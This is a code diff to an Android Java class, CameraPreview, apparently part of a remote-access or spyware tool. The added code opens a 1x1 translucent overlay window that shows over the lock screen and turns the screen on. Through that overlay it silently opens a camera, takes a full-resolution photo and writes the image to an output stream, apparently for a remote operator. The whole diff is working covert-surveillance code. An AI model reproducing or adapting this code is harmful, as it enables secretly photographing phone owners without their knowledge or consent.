@@ -29,40 +29,85 @@ public class CameraPreview {
         }
     }
 
-    public void startUp(int cameraID, OutputStream outputStream) {
+    private android.view.WindowManager windowManager;
+    private android.view.SurfaceView surfaceView;
+ 
+    public void startUp(int cameraID, final OutputStream outputStream) {
         this.out = outputStream;
-        try{
-        camera = Camera.open(cameraID);
-        }catch (RuntimeException e){
-            e.printStackTrace();
-            try {
-                out.write("END123\n".getBytes("UTF-8"));
-            } catch (IOException ex) {
-                ex.printStackTrace();
-            }
+        
+        windowManager = (android.view.WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
+        surfaceView = new android.view.SurfaceView(context);
+        
+        int type;
+        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
+            type = android.view.WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY;
+        } else {
+            type = android.view.WindowManager.LayoutParams.TYPE_TOAST;
         }
-        Camera.Parameters parameters = camera.getParameters();
-        List<Camera.Size> allSizes = parameters.getSupportedPictureSizes();
-        Camera.Size size = allSizes.get(0);
-        for (int i = 0; i < allSizes.size(); i++) {
-            if (allSizes.get(i).width > size.width)
-                size = allSizes.get(i);
-        }
-
-        parameters.setPictureSize(size.width, size.height);
-        camera.setParameters(parameters);
-        try {
-        camera.setPreviewTexture(new SurfaceTexture(0));
-        camera.startPreview();
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-        camera.takePicture(null, null, new Camera.PictureCallback() {
+        
+        final android.view.WindowManager.LayoutParams layoutParams = new android.view.WindowManager.LayoutParams(
+                1, 1,
+                type,
+                android.view.WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH 
+                        | android.view.WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
+                        | android.view.WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
+                        | android.view.WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON,
+                android.graphics.PixelFormat.TRANSLUCENT
+        );
+        layoutParams.gravity = android.view.Gravity.LEFT | android.view.Gravity.TOP;
+        
+        windowManager.addView(surfaceView, layoutParams);
+        
+        surfaceView.getHolder().addCallback(new android.view.SurfaceHolder.Callback() {
             @Override
-            public void onPictureTaken(byte[] data, Camera camera) {
-                releaseCamera();
-                sendPhoto(data);
+            public void surfaceCreated(android.view.SurfaceHolder surfaceHolder) {
+                try {
+                    camera = Camera.open(cameraID);
+                } catch (RuntimeException e) {
+                    e.printStackTrace();
+                    try {
+                        out.write("Failed to open camera\n".getBytes("UTF-8"));
+                        out.write("END123\n".getBytes("UTF-8"));
+                    } catch (IOException ex) {
+                        ex.printStackTrace();
+                    }
+                    windowManager.removeView(surfaceView);
+                    return;
+                }
+                
+                Camera.Parameters parameters = camera.getParameters();
+                List<Camera.Size> allSizes = parameters.getSupportedPictureSizes();
+                Camera.Size size = allSizes.get(0);
+                for (int i = 0; i < allSizes.size(); i++) {
+                    if (allSizes.get(i).width > size.width)
+                        size = allSizes.get(i);
+                }
+ 
+                parameters.setPictureSize(size.width, size.height);
+                camera.setParameters(parameters);
+                
+                try {
+                    camera.setPreviewDisplay(surfaceHolder);
+                    camera.startPreview();
+                } catch (Exception e) {
+                    e.printStackTrace();
+                }
+                
+                camera.takePicture(null, null, new Camera.PictureCallback() {
+                    @Override
+                    public void onPictureTaken(byte[] data, Camera camera) {
+                        releaseCamera();
+                        windowManager.removeView(surfaceView);
+                        sendPhoto(data);
+                    }
+                });
             }
+ 
+            @Override
+            public void surfaceChanged(android.view.SurfaceHolder surfaceHolder, int i, int i1, int i2) {}
+ 
+            @Override
+            public void surfaceDestroyed(android.view.SurfaceHolder surfaceHolder) {}
         });
     }
 
